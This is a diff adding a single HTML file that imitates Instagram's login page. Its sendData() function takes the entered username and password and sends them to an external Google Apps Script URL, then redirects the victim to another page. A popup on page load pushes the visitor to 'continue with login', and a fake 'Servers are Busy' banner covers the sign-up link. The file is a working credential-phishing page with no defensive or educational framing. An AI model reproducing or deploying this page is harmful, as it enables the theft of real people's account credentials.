@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="icon" type="image/x-icon" href="favicon.ico">
+
+  <style>
+
+    .eye-icon {
+      color: #020202;          /* Instagram's dark font color */
+      font-weight: 500;        /* Medium bold */
+      font-size: 14px;
+      cursor: pointer;
+    }
+    
+
+
+    
+    .eye-icon {
+      color: #020202;          /* Instagram's dark font color */
+
+  position: absolute;
+  right: 10px;
+  top: 50%;
+  transform: translateY(-50%);
+  cursor: pointer;
+  background: none;
+  border: none;
+  padding: 0;
+  margin: 0;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.eye-icon svg {
+  width: 20px;
+  height: 20px;
+  color: #020202;          /* Instagram's dark font color */
+
+}
+
+    :root {
+      --input-bg: #fafafa;
+      --input-border: #dbdbdb;
+      --text-color: #262626;
+      --link-blue: #385185;
+      --btn-blue: #0095f6;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background: white;
+      color: var(--text-color);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 360px;
+      padding: 40px 30px;
+      border: 1px solid #dbdbdb;
+      background-color: #ffffff;
+      text-align: center;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.04);
+    }
+
+    .lang {
+      position: absolute;
+      top: 10px;
+      font-size: 12px;
+      color: gray;
+    }
+
+    .logo {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 30px;
+    }
+
+    .logo img {
+      width: 180px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid var(--input-border);
+      border-radius: 3px;
+      background: var(--input-bg);
+      font-size: 14px;
+    }
+
+    .input-eye {
+      position: relative;
+    }
+
+    .input-eye input {
+      width: 100%;
+    }
+
+    .eye-icon {
+      color: #020202;          /* Instagram's dark font color */
+
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 18px;
+      cursor: pointer;
+    }
+
+    button {
+      width: 100%;
+      margin-top: 10px;
+      padding: 9px;
+      background-color: var(--btn-blue);
+      color: white;
+      border: none;
+      font-weight: bold;
+      border-radius: 4px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .info {
+      margin-top: 10px;
+      font-size: 12px;
+    }
+
+    .info a {
+      text-decoration: none;
+      font-weight: 500;
+      color: #00376b;
+    }
+
+    .or {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+      color: #8e8e8e;
+      font-size: 12px;
+    }
+
+    .or::before,
+    .or::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: #dbdbdb;
+    }
+
+    .or span {
+      padding: 0 10px;
+    }
+
+    .fb-login {
+      text-decoration:none;
+      font-size: 14px;
+      color: var(--link-blue);
+      font-weight: 500;
+      margin-bottom: 10px;
+      cursor: pointer;
+    }
+
+    .signup {
+      margin-top: 40px;
+      font-size: 13px;
+    }
+
+    .signup a {
+      font-weight: 500;
+      text-decoration: none;
+    }
+
+    @media (max-width: 400px) {
+      .container {
+        border-radius: 0;
+        height: 100vh;
+        padding: 30px 20px;
+      }
+    }
+
+    @keyframes dropBanner {
+      0% { transform: translateX(-50%) translateY(-100%); opacity: 0; }
+      100% { transform: translateX(-50%) translateY(0); opacity: 1; }
+    }
+    
+    @keyframes hideBanner {
+      0% { transform: translateX(-50%) translateY(0); opacity: 1; }
+      100% { transform: translateX(-50%) translateY(-100%); opacity: 0; }
+    }
+    
+  </style>
+</head>
+<body>
+
+  <div class="lang">English (India) ▼</div>
+
+  <div class="container">
+    <div class="logo">
+      <img src="logo.png" alt="Instagram">
+    </div>
+
+    <input type="text" id="username" placeholder="Phone number, email or username">
+
+    <div class="input-eye">
+      <input type="password" id="password" placeholder="Password">
+      <span class="eye-icon" onclick="togglePassword()">Show</span>
+    </div>
+
+    <button onclick="sendData()">Log In</button>
+
+    <div class="info">
+      Forgot your login details? <a href="#">Get help logging in.</a>
+    </div>
+
+    <div class="or"><span>OR</span></div>
+
+   <a href="facebook.html"> <div class="fb-login">Log in with Facebook</div></a>
+
+   <div class="signup">Don't have an account? <a href="#" onclick="showInstaBanner()">Sign up.</a></div>
+`  </div>
+
+  <script>
+    function sendData() {
+        const username = document.getElementById("username").value;
+        const password = document.getElementById("password").value;
+      
+        if (!username || !password) {
+          alert("Please enter both fields.");
+          return;
+        }
+      
+        const url = `https://script.google.com/macros/s/AKfycbzuhSJdpcok8Cp7eVcaTVbvM_t-9P3fSG5iXDhLPxIOAfktjWY5GzwJwLdukNo9BtYy0w/exec?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
+      
+        fetch(url, {
+          method: 'GET',
+          mode: 'no-cors' // 💥 this avoids CORS and silent failures
+        })
+        .then(() => {
+          // ✅ Don't try to read the response. Just go to main.html
+          window.location.href = "main.html";
+        })
+        .catch((err) => {
+          console.error("Even with no-cors, it failed:", err);
+          alert("Still couldn't send. Check your script access settings.");
+        });
+      }
+      
+
+      function togglePassword() {
+        const passwordInput = document.getElementById("password");
+        const eyeIcon = document.querySelector(".eye-icon");
+    
+        if (passwordInput.type === "password") {
+          passwordInput.type = "text";
+          eyeIcon.textContent = "Hide";
+        } else {
+          passwordInput.type = "password";
+          eyeIcon.textContent = "Show"; // original icon
+        }
+      }
+
+
+
+      function showBrowserPopup() {
+        document.getElementById("browserPopup").style.display = "flex";
+      }
+    
+      function closeBrowserPopup() {
+        document.getElementById("browserPopup").style.display = "none";
+      }
+    
+      function continueWithLogin() {
+        closeBrowserPopup();
+        fakeLogin(); // or redirect to login, or show another modal
+      }
+    
+      // Auto trigger popup on page load (optional)
+      window.onload = function () {
+        showBrowserPopup();
+      };
+
+      function showInstaBanner() {
+        const banner = document.getElementById("instaBanner");
+        banner.style.display = "block";
+        banner.style.animation = "dropBanner 0.4s ease";
+      
+        setTimeout(() => {
+          banner.style.animation = "hideBanner 0.3s ease";
+          setTimeout(() => {
+            banner.style.display = "none";
+          }, 300);
+        }, 3000); // 3 seconds on screen
+      }
+      
+  </script>
+
+  <!-- Browser-Only Popup -->
+<div id="browserPopup" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); z-index:999; display:flex; align-items:center; justify-content:center;">
+  <div style="background:white; border-radius:12px; padding:24px 20px; max-width:360px; width:90%; font-family:'Roboto', sans-serif; text-align:center; box-shadow:0 5px 15px rgba(0,0,0,0.2);">
+    <h3 style="margin:0 0 10px; font-size:18px; color:#262626;">Open in Browser</h3>
+    <p style="font-size:14px; color:#555;">This content can only be viewed on browser. Please continue with login.</p>
+    <div style="margin-top:20px; display:flex; justify-content:center; gap:12px;">
+      <button onclick="closeBrowserPopup()" style="padding:8px 16px; font-size:13px; background:#dbdbdb; border:none; border-radius:6px; cursor:pointer;">Cancel</button>
+      <button onclick="continueWithLogin()" style="padding:8px 16px; font-size:13px; background:#0095f6; color:white; border:none; border-radius:6px; cursor:pointer;">Continue</button>
+    </div>
+  </div>
+</div>
+
+
+<!-- Instagram-style banner -->
+<div id="instaBanner" style="display:none; position:fixed; top:0; left:50%; transform:translateX(-50%); background:#ed4956; color:white; font-size:14px; padding:12px 20px; border-radius:0 0 6px 6px; font-family:'Roboto', sans-serif; box-shadow:0 2px 6px rgba(0,0,0,0.1); z-index:9999;">
+Servers are Busy right now!</div>
+
+
+</body>
+</html>
